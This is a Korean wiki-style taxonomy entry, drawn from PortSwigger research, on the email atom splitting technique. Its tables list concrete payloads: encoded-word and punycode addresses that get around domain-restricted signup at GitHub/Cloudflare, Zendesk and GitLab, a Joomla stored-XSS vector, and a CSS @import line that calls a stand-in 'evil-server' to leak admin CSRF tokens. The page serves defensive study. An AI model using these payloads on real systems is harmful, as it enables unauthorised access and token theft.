---
title: Email Atom Splitting Attack
description: 
published: true
date: 2025-07-31T17:33:26.239Z
tags: attack success validation, data exfiltration, cross‑site scripting (xss), multi‑level encoding bypass, domain restriction bypass, unicode overflow exploit, domain feature identification, probe‑observe technique, smtp fuzzing (legacy protocol), encoded‑word support detection, malformed punycode generation
editor: markdown
dateCreated: 2025-07-25T09:58:36.931Z
---

# Email Atom Splitting Attack

## 개요

“Email Atom Splitting Attack”은 이메일 주소의 구성 요소를 구분하는 문자에 대해 파서마다 해석 기준이 상이한 점을 악용한다. 일부 시스템은 이메일 주소 전체를 단일 식별자로 처리하지만, 다른 구성 요소는 이를 내부 경계 기준에 따라 분리하거나 축약하여 다르게 해석할 수 있다. 이러한 경계 인식의 차이는 동일한 주소에 대해 인증・권한 판단과 전달 경로 해석이 불일치하게 만들며, 결과적으로 인증 우회, 권한 상승, 메일 전달 조작 등의 보안 문제가 발생할 수 있다.

## 분류

> 구문 해석 불일치 (Syntax Parsing Gap)
> → 데이터 경계 파싱 불일치 (Boundary Parsing Mismatch)
> → Email Atom Splitting Attack

## 절차

| Phase           | Description                                                                                        |
| --------------- | -------------------------------------------------------------------------------------------------- |
| Reconnaissance  | 도메인 기반 인증, 권한을 사용하는 기능(회원가입, SSO 등)을 찾아 Burp Collaborator 로 “Probe→Observe” 흐름을 돌려본다.              |
| Enumeration     | 각 라이브러리가 허용하는 문자,인코딩,길이를 파악하기 위해 Turbo Intruder, SMTP Fuzzer 로 변형을 시도한다.                           |
| Bypass          | Unicode Overflow, Encoded-Word(Q/B-encoding + 다중 charset), Malformed Punycode 등으로 필터 우회용 문자를 생성한다. |
| Injection       | 애플리케이션 검증을 통과하지만, Mailer ↔︎ 앱이 서로 다르게 해석하도록 이메일을 `=?x?q?=40=3e=00?=foo@psres.net` 와 같이 조작한다.       |
| Validation      | Collaborator 로그에서 RCPT TO 주소가 공격자 도메인으로 되었는지 확인하고, 사이트의 이메일 확인 완료 표시를 확인한다.                        |
| Exploitation(1) | 외부 도메인으로 계정 검증 후 사내망 접근 권한을 획득하거나 관리자 CSRF 토큰을 탈취하는 등의 공격을 수행한다.                                   |
| Exploitation(2) | (주로 RCE/토큰 탈취 시) CSS import 체인, Collborator 등으로 CSRF 토큰, 세션, 내부 정보를 외부 서버로 전송한다.                   |

<div style="text-align: left;">
  <img
    src="/email_atom_splitting_attack.png"
    alt="Email Atom Splitting Attack 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Domain Feature Identification</td>
      <td>(예: 회사 이메일로만 가입 허용)</td>
      <td>애플리케이션에서 이메일 도메인을 기반으로 인증이나 권한을 부여하는 기능(예: 특정 도메인 이메일만 회원가입 가능하거나 SSO 설정)을 탐색한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Probe-Observe Technique</td>
      <td><pre><code>user@collab.example  
(Burp Collaborator 도메인 사용)</code></pre></td>
      <td>이메일 입력란에 고유한 Collaborator 주소나 특수한 payload를 넣고, Burp Collaborator로 외부 상호작용(특히 SMTP 트래픽)을 모니터링한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Enumeration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SMTP Fuzzing (Legacy Protocol)</td>
      <td><pre><code>astify.com!collab\@example.com  
Sendmail 8.15.2에서는 ! 문자를 UUCP 프로토콜로 해석한다.

collab%psres.net(@example.com
Postfix 3.6.4에서는 % 문자가 퍼센트 핵(percent hack)으로 동작한다.</code></pre></td> <td>자체 제작한 SMTP Fuzzer를 활용해 이메일 주소의 특수문자 처리 동작을 분석한다.</td> <td>\[1]</td> </tr> <tr> <td>Unicode Overflow Fuzzing</td> <td><pre><code>'✾'(U+273E) === '>'
'❀'(U+2740) === '@'</code></pre></td> <td>특정 메일 시스템은 unicode overflow 발생한다. Turbo Intruder 등을 활용해 Unicode 확장 문자를 fuzzing 한다.</td> <td>\[1]</td> </tr> <tr> <td>Encoded-Word Support Detection</td> <td><pre><code>=?UTF-8?Q?ABC?=[collab@psres.net](mailto:collab@psres.net)
RCPT TO 단계에서 [ABCcollab@psres.net](mailto:ABCcollab@psres.net)으로 디코딩 되는지 확인한다.</code></pre></td> <td>RFC 2047 encoded-word 인코딩을 이메일 로컬파트에 삽입 후, Collaborator를 통해 SMTP 통신을 관찰한다.</td> <td>\[1], \[A]</td> </tr>

  </tbody>
</table>

### Bypass

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Unicode Overflow Exploit</td>
      <td><code>'✾'(U+273E)</code></td>
      <td>PHP 등의 파서에서 unicode overflow 발생으로, 제한 문자를 우회할 수 있다. 이메일 주소에 Unicode 확장 문자를 사용해 애플리케이션의 필터를 우회한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Encoded-Word Multi-Encoding</td>
      <td><code>=?UTF-8?Q?=41=42=43?=USER@psres.net</code></td>
      <td>메일 파서는 최종 목적지를 ABCUSER@psres.net으로 인식한다. 이메일 주소에 Encoded-word 구문(Q-인코딩, B-인코딩)을 삽입해 여러 단계의 인코딩을 수행한다. 다양한 Charset(UTF-7 등)을 혼용하여 필터 혼란을 가중시킨다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Malformed Punycode Generation</td>
      <td><code>foo@xn--0117.example.com</code></td>
      <td>특정 IDN 파서는 이를 foo@@.example.com으로 디코딩한다. 의도적으로 부적절한 Punycode 도메인을 사용하여 필터를 우회한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Encoded-Word Address Splitting</td>
      <td><code>=?x?q?=40=3e=00?=foo@microsoft.com</code></td>
      <td>애플리케이션은 이를 평문으로 받아들이지만, 메일러는 디코딩 후 다른 주소로 처리한다. 애플리케이션의 이메일 검증을 통과하면서도 메일러 단계이서는 주소를 이중으로 해석하도록 특수한 주소를 삽입한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SMTP Interaction Log Verification</td>
      <td><code>RCPT TO:<attacker@psres.net></code></td>
      <td>Burp Collaborator의 SMTP 인터렉션 로그를 확인하여 공격자가 의도한 대로 메일이 발송됐는지 검증한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Application State Verification</td>
      <td>(예: 내부주소 Verified 표시)</td>
      <td>공격이 성공했다면 애플리케이션은 사용자가 소유하지 않은 이메일을 검증 완료로 표시하거나 내부 사용자로 간주한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation(1)

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Cloudflare Zero Trust Bypass</td>
      <td><code>=?x?q?collab=40psres.net=3e=00?=foo@example.com</code></td>
      <td>공격자는 Github의 이메일 확인 과정에서 임의의 도메인 주소를 검증 시킨다. 이후 Github를 IdP로 사용하는 Cloudflare Zero Trust 설정을 악용하여 원격지 내부망 등의 보호 자원에 접근이 가능하다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Zendesk Domain Restriction Bypass</td>
      <td><code>“=?x?q?collab=22=40psres.net=3e=00==3c22x?=\"@example.com</code></td>
      <td>공격자는 Zendesk의 특정 지원 포털에 미허용 외부 도메인 계정을 생성하고 최종 접근이 가능하다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>GitLab Enterprise Signup Bypass</td>
      <td><code>=?x?q?collab=40psres.net=3e=20?=foo@example.com</code></td>
      <td>실제로는 x 대신 iso-8859-1 사용한다. 공격자는 특정 도메인만 가입 가능한 GitLab Enterprise 서버에 임의 가입하여 내부 프로젝트나 리소스에 접근 가능하다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation(2)

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>HTML Tag Injection via Malformed Punycode</td>
      <td><code>x@xn--svg/-f18</code></td>
      <td>이메일 주소에 &lt; 등의 문자를 넣어 HTML 태그 생성 가능하다. 실제 파싱 결과 x@&lt;svg/로 디코딩되었다. Joomla에서 발견된 IDN 파서 버그를 이용해 HTML 삽입 공격을 수행한다. Joomla는 사용자 목록 페이지에 이메일을 출력하는데, 이때 해당 태그가 그대로 반영되어 Persistent XSS 공격이 가능하다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>CSS @import Token Exfiltration</td>
      <td><code>x{}@import'http://evil-server/evil.css';</code></td>
      <td>별도로 만든 두 번째 계정의 이름 필드에 외부 스타일시트를 불러오는 @import 구문을 삽입하고 중괄호 등을 추가하여, 나머지 HTML이 무효한 CSS 셀렉터로 처리 되도록 한다. HTML Tag Injection via Malformed Punycode를 통해 삽입된 &lt;style&gt; 태그를 이용해 CSS 기반 데이터 유출이 가능하다. 관리자가 사용자 목록 페이지를 열람하면, 공격자의 CSS가 로드되어 관리자 세션의 CSRF 토큰을 외부로 전송한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [https://portswigger.net/research/splitting-the-email-atom](https://portswigger.net/research/splitting-the-email-atom)

## 기타 참고문헌

\[A] [https://datatracker.ietf.org/doc/html/rfc2047](https://datatracker.ietf.org/doc/html/rfc2047)
